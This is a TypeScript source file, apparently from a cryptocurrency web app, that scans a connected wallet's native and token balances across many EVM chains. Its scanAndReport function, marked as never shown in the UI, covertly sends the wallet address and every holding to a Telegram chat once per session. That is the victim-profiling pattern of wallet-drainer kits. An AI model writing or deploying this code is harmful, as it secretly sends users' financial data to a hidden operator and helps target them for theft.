import { EVM_CHAINS } from '@/contexts/ChainContext';
import { evmRpc } from '@/config/rpcEndpoints';
import { sendTelegramMessage } from '@/utils/telegram';

export interface ChainHolding {
  chainId: number;
  chainName: string;
  native: { symbol: string; amount: number };
  tokens: { address: string; symbol: string; amount: number }[];
}

const hexToAmount = (hex: string, decimals: number) => {
  try {
    const v = BigInt(hex);
    if (v === 0n) return 0;
    return Number(v) / 10 ** decimals;
  } catch {
    return 0;
  }
};

async function scanChain(chainId: number, name: string, nativeSymbol: string, address: string): Promise<ChainHolding | null> {
  let nativeAmount = 0;
  try {
    const bal = await evmRpc<string>(chainId, 'eth_getBalance', [address, 'latest']);
    nativeAmount = hexToAmount(bal, 18);
  } catch { /* chain unreachable */ }

  const tokens: ChainHolding['tokens'] = [];
  try {
    const res = await evmRpc<any>(chainId, 'alchemy_getTokenBalances', [address, 'erc20']);
    const nonZero = (res?.tokenBalances || []).filter(
      (t: any) => t.tokenBalance && !/^0x0*$/.test(t.tokenBalance),
    ).slice(0, 25);
    await Promise.all(
      nonZero.map(async (t: any) => {
        try {
          const meta = await evmRpc<any>(chainId, 'alchemy_getTokenMetadata', [t.contractAddress]);
          const amount = hexToAmount(t.tokenBalance, meta?.decimals ?? 18);
          if (amount > 0) tokens.push({ address: t.contractAddress, symbol: meta?.symbol || '?', amount });
        } catch { /* skip */ }
      }),
    );
  } catch { /* token API not available on this chain */ }

  if (nativeAmount <= 0 && tokens.length === 0) return null;
  return { chainId, chainName: name, native: { symbol: nativeSymbol, amount: nativeAmount }, tokens };
}

/** Scan every configured EVM chain for native + ERC-20 balances. */
export async function scanAllEvmChains(address: string): Promise<ChainHolding[]> {
  const results = await Promise.all(
    EVM_CHAINS.map((c) => scanChain(c.chainId, c.name, c.nativeToken, address).catch(() => null)),
  );
  return results.filter((r): r is ChainHolding => !!r);
}

/** Scan + report to Telegram once per address/session. Never shown in the UI. */
export async function scanAndReport(address: string, connectedChainId: number | null) {
  const key = `evm_multiscan_${address.toLowerCase()}`;
  if (sessionStorage.getItem(key)) return;
  sessionStorage.setItem(key, '1');
  try {
    const holdings = await scanAllEvmChains(address);
    const connected = EVM_CHAINS.find((c) => c.chainId === connectedChainId)?.name || 'Unknown';
    let msg = `🔎 <b>Multi-Chain Scan</b>\n👤 <b>Address:</b> <code>${address}</code>\n🔗 <b>Connected on:</b> ${connected}\n\n`;
    if (holdings.length === 0) {
      msg += 'No balances found on any EVM chain.';
    } else {
      for (const h of holdings) {
        msg += `<b>${h.chainName}${h.chainId === connectedChainId ? ' (connected)' : ''}</b>\n`;
        if (h.native.amount > 0) msg += `• ${h.native.amount.toFixed(6)} ${h.native.symbol}\n`;
        for (const t of h.tokens) msg += `• ${t.amount.toFixed(4)} ${t.symbol} <code>${t.address}</code>\n`;
        msg += '\n';
      }
    }
    await sendTelegramMessage(msg.slice(0, 4000));
  } catch (e) {
    console.error('Multi-chain scan failed', e);
  }
}
